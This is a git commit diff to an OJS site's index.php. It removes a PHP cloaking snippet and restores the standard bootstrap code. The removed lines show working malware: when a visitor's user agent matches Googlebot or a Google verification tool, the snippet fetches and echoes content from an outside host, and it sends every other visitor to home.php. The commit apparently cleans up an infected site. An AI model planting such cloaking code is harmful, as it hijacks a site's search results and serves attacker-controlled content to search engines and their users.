4b39a65bf5ccd77bb796d1dabd4a0b25da71e26c
gajah4254-alt <gajah4254@gmail.com>
2026-08-09 14:45:56 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,12 +1,21 @@
 <?php
-function check_user_agent($agent) {
-    return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
-}
-if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification') || check_user_agent('Google-InspectionTool')) 
-{ 
-  echo file_get_contents('https://script-kita.site/__rs30r7/r');
-  exit;
-} else {
-  include 'home.php';
-}
-?>
+
+/**
+ * @file index.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * Bootstrap code for OJS site. Loads required files and then calls the
+ * dispatcher to delegate to the appropriate request handler.
+ */
+
+use APP\core\Application;
+
+// Initialize global environment
+define('INDEX_FILE_LOCATION', __FILE__);
+require_once './lib/pkp/includes/bootstrap.php';
+
+// Serve the request
+Application::get()->execute();
